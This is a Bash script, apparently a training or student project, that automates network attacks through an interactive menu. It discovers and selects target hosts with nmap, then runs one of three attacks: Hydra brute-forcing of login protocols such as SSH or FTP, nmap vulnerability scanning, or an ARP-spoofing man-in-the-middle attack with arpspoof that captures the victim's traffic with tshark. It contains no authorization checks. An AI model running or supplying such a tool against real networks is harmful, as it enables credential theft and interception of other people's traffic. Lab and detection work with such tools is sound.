#!/bin/bash

HOME=$(pwd)
LOGFILE=/var/log/checker.log

BOLD="\e[1m"
RED="\e[31m"
YELLOW="\e[33m"
RESET="\e[0m"

# in this function i get the ip of the victim, every attack jumps here so that i could write it once.
function ADDRESSES()
{
	mkdir -p $HOME/Checker
	cd $HOME/Checker
	
	echo "Would you like me to scan your network or a different one?" | pv -qL 20
	echo -en "[1] Local network\n[2] Manual input\nEnter your choice: " | pv -qL 20
	read NET
	
	if [[ "$NET" == "1" ]]
		then
			SUBNET=$(ip addr show eth0 | grep -w 'inet' | awk '{print $2}')
			nmap "$SUBNET" -sn | grep report | awk '{print $NF}' > ./ip.txt
			
	elif [[ "$NET" == "2" ]]
		then
			echo "What network would you like to attack? (NOTE: use 0.0.0.0/24)" | pv -qL 20
			read address
			nmap "$address" -sn | grep report | awk '{print $NF}' > ./ip.txt
	fi
	
	if [[ ! -s ./ip.txt ]]
		then
			echo -e "${RED}No active hosts found! Exiting...${RESET}" | pv -qL 20
			exit 1
	fi
	
	echo ""
	echo -e "${BOLD}Displaying the list of available ips:${RESET}" | pv -qL 20
	cat ./ip.txt | pv -qL 35
	echo ""
	
	echo -e "Would you like to use a random ip or choose on your own?\n [1] Random ip\n [2] Choose manually" | pv -qL 20
	echo -ne "Enter your choice: " | pv -qL 20
	read choice
	
	if [[ $choice == "1" ]]
		then
			ip=$(shuf ./ip.txt -n 1)
			echo "Randomly selected ip: $ip" | pv -qL 20
	elif [[ $choice == "2" ]]
		then
			echo -ne "Enter the ip to attack: " | pv -qL 20
			read ip
	else
		echo -e "${RED}Wrong input! Exiting!${RESET}" | pv -qL 35
		exit
	fi
	echo ""
}

# this function is the brute force attack, the user need to insert the pass and user files the use hydra to brute the protocol asked by the user.
function BRUTE()
{
	echo "You chose Brute Force!" | pv -qL 20
	echo -e "${YELLOW}This attack will use Hydra to brute force the address that you choose.${RESET}" | pv -qL 20
	ADDRESSES
	
	echo "Please insert the path to your usernames file:" | pv -qL 20
	read userfile
	echo "Please insert the path to your passwords file:" | pv -qL 20
	read passfile
	echo "What protocol would you like to attack? [ftp/ssh/telnet/..]" | pv -qL 20
	read proto
	
	echo -e "${BOLD}Hydra starting...${RESET}" | pv -qL 20
	hydra -L "$userfile" -P "$passfile" "$ip" "$proto"
	
	echo "$(date) - Brute Force Attack - Target: $ip" >> "$LOGFILE"
	
}

# this is the nmap attack, it collects info about open ports and vulners.
function NMAP()
{
	echo "You chose Port Scanning!" | pv -qL 20
	echo -e "${YELLOW}This attack will use Nmap to scan the open ports and find\nthe vulnerabilities of the address that you choose.${RESET}" | pv -qL 20
	ADDRESSES
	
	echo -e "${BOLD}Starting Nmap...${RESET}" | pv -qL 20
	nmap -sV -sC $ip | tee ./nmap.txt
	echo -e " \n \n \n " >> ./nmap.txt
	echo "Results also saved to $HOME/Checker/nmap.txt"
	
	echo "$(date) - Port Scanning Attack - Target: $ip" >> "$LOGFILE"
}

# this is the man in the middle attack, uses arpspoof to trick the router and the victim into giving us all the info of their traffic
function MiTM()
{
	echo "You chose Man In The Middle!" | pv -qL 20
	echo -e "${YELLOW}This attack will use Arpspoof to manipulate your current router\ninto giving information about the address that you choose.${RESET}" | pv -qL 20
	ADDRESSES
	
	router=$(ip route | grep default | awk '{print $3}')
	
	echo -ne "How much time(seconds) will the attack go on? " | pv -qL 20
	read time
	
	echo -e "${BOLD}Starting Arpspoof...${RESET}" | pv -qL 20
	
	tshark -w MiTM.pcap -i eth0 -a duration:"$time" > /dev/null 2>&1 &
	TSHARK_PID=$!
	 
	sudo arpspoof -i eth0 -t "$ip" "$router" > /dev/null 2>&1 &
	ARP_PID1=$!
	
	sudo arpspoof -i eth0 -t "$router" "$ip" > /dev/null 2>&1 &
	ARP_PID2=$!
	
	sleep "$time"
	sudo kill "$ARP_PID1" "$ARP_PID2" "$TSHARK_PID"
	sudo pkill "arpspoof"
	sudo pkill "tshark"
	
	echo -e "${RED}Stopping Arpspoof...${RESET}" | pv -qL 20
	echo "Attack finished. Packet saved as MiTM.pcap" | pv -qL 20
	echo "$(date) - MiTM attack - Target: $ip" >> "$LOGFILE"
}

#this is the main menu, need to choose the attack, or shuf to random, also it installs pv, which make the echo look nicer.

function MENU()
{
	
	dpkg -s pv >/dev/null 2>&1 ||
	sudo apt-get install pv -y >/dev/null 2>&1
	
	
	echo -e "Choose an attack:\n [1] Brute Force\n [2] Port Scan\n [3] Man In The Middle\n [4] Random Attack" | pv -qL 20
	echo -ne "Enter your choice: " | pv -qL 20
	read attack
	echo ""
	case $attack in
	1)
		BRUTE
	;;
	2)
		NMAP
	;;
	3)
		MiTM
	;;
	4)
		random=$(shuf -e 1 2 3 | head -1)
		case $random in
			1)
				BRUTE
			;;
			2)
				NMAP
			;;
			3)
				MiTM
			;;
		esac
	;;
	*)
		echo -e "${RED}Invalid option! Exiting!${RESET}" | pv -qL 35
		exit
	;;
	esac
	
}

echo -e "${BOLD}Warning! This script might require SUDO.${RESET}"
if [[ ! -f "$LOGFILE" ]]
	then
		sudo touch "$LOGFILE"
		sudo chmod 666 "$LOGFILE"
fi

MENU
